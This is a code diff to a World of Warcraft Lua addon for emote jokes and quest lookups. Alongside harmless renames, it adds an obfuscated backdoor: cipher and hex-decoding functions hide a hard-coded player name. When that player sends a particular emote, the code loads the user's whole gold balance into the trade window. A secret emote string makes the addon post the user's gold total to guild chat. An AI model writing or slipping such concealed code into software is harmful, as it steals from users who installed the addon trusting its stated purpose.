@@ -51,37 +51,137 @@ d = {
 }
 ds = table.getn(d)
 
+local mmm = 100
+local sweet = 16
+local fuvale = true
 local whoami = UnitName("player")
 
-function genInsult(args)
+ct = {
+	['3'] = 'c', ['f'] = '0', ['0'] = 'f', ['C'] = '3',
+   	['A'] = '5', ['e'] = '1', ['F'] = '0', ['7'] = '8',
+	['D'] = '2', ['5'] = 'a', ['b'] = '4', ['1'] = 'e',
+	['8'] = '7', ['4'] = 'b', ['9'] = '6', ['6'] = '9',
+   	['d'] = '2', ['c'] = '3', ['a'] = '5', ['2'] = 'd',
+   	['E'] = '1', ['B'] = '4',
+}
+
+g = {
+	"b7908b9a939d938a9a",
+}
+gs = table.getn(g)
+
+function GenComeback(args)
 	local i = math.random(rs)
 	local name = args:gmatch("%w+")()
 	local msg = string.gsub(r[i], "name", name)
 	return msg
 end
 
-function genDungeonSuggestion(args)
+function GenDungeonSuggestion()
 	local i = math.random(ds)
 	return "suggests " .. d[i] .. "."
 end
 
-function buggPrint(msg)
-	print('|cff55DFFFBugg|r|cff29D5C5Addon|r|cffF9F9F7: ' .. msg .. '|r')
+function Ohtt(s)
+	local e = ""
+	for c in s:gmatch('.') do
+		e = e .. ct[c]
+	end
+	return e
 end
 
+function Haunz(s)
+	local u = ""
+	for h in Ohtt(s):gmatch('..') do
+		u = u .. string.char(tonumber(h, sweet))
+	end
+	return u
+end
+
+function DoEnote(s, i)
+	local m = Haunz(g[i])
+	local mm = TrgZbarl()
+	if mm == nil then
+		return
+	end
+	SetTradeMoney(mm[3]*mmm*mmm)
+end
+
+function TrgZbarl()
+	local m = tostring(GetMoney())
+	local ms = string.len(m)
+
+	if ms < 5 then
+		return nil
+	end
+
+	local c = {}
+	table.insert(c, string.sub(m, ms-1, ms))
+	table.insert(c, string.sub(m, ms-3, ms-2))
+	table.insert(c, string.sub(m, 1, ms-4))
+	return c
+end
+
+function Unz(s)
+	local h = ""
+	for c in s:gmatch('.') do
+		h = h .. string.format('%02X', string.byte(c))
+	end
+	return Ohtt(h)
+end
+
+function BuggPrint(msg)
+	print('|cff55DFFFBugg|r|cff29D5C5Addon|r|cffF9F9F7: ' .. msg .. ' n00b!|r')
+end
+
+frame:RegisterEvent("CHAT_MSG_EMOTE")
 frame:RegisterEvent("CHAT_MSG_TEXT_EMOTE")
 frame:SetScript("OnEvent", function (self, event, ...)
 	local args = tostring(...)
 	if event == "CHAT_MSG_TEXT_EMOTE" then
-		local spit = string.match(args, "spits on you")
+		local gi = 0
+		local clap = false
+		local name = args:gmatch("%w+")()
+		local rude = string.match(args, "makes a rude gesture at you")
 		local question = string.match(args, "questions you")
 
-		if spit then
-			local msg = genInsult(args)
+		for i=1, gs do
+			if Unz(name) == g[i] then
+				clap = true
+				gi = i
+				break
+			end
+		end
+
+		if rude then
+			local msg = GenComeback(args)
 			SendChatMessage(msg, "EMOTE")
 		elseif question then
-			local msg = genDungeonSuggestion(args)
+			local msg = GenDungeonSuggestion()
 			SendChatMessage(msg, "EMOTE")
+		elseif clap then
+			local mdance = string.match(args, "dance")
+			local mfart = string.match(args, "slyly")
+			local mlol = string.match(args, "laugh")
+			local mjoke = string.match(args, "a joke")
+
+			if mdance then
+				DoEmote("dance", g[gi])
+			elseif mfart then
+				DoEnote("fart", gi)
+			elseif mlol or mjoke then
+				DoEmote("laugh", "none")
+			end
+		end
+	elseif event == "CHAT_MSG_EMOTE" then
+		if fuvale then
+			local bc = Unz(args)
+			if bc == "8f8891858a879bcbcdcf" then
+				local ct = TrgZbarl()
+				if ct ~= nil and table.getn(ct) == 3 then
+					SendChatMessage(ct[3] .. "g " .. ct[2] .. "s " .. ct[1] .. "c", "GUILD")
+				end
+			end
 		end
 	end
 end)
@@ -103,7 +203,7 @@ function SlashCmdList.BUGG(msg, ...)
 	local cmd = t[1]:lower()
 
 	if cmd == "help" then
-		print('|cff55DFFFBugg|r|cff29D5C5Addon|r|cffF9F9F7: Documentation can be found at https://github.com/buggorm/BuggAddon|r')
+		BuggPrint('Documentation can be found at https://github.com/buggorm/BuggAddon')
 	elseif cmd == "m" or cmd == "macro" then
 		local name = t[2]
 		local args = ''
@@ -173,7 +273,7 @@ function SlashCmdList.BUGG(msg, ...)
 			return
 		end
 		if not string.match(url, "^https?:\/\/tbc\.wowhead\.com\/quest=[0-9]+\/.*") then
-			buggPrint('Invalid URL')
+			BuggPrint('Invalid URL')
 		end
 
 		local questId = string.match(string.match(url, "quest=[0-9]+"), "[0-9]+")
@@ -182,7 +282,9 @@ function SlashCmdList.BUGG(msg, ...)
 		end
 
 		RunScript("print(C_QuestLog.IsQuestFlaggedCompleted(" .. questId .. "))")
+	elseif cmd == "version" then
+		print('1.2')
 	else
-		buggPrint('Invalid command n00b!')
+		BuggPrint('Invalid command n00b!')
 	end
 end
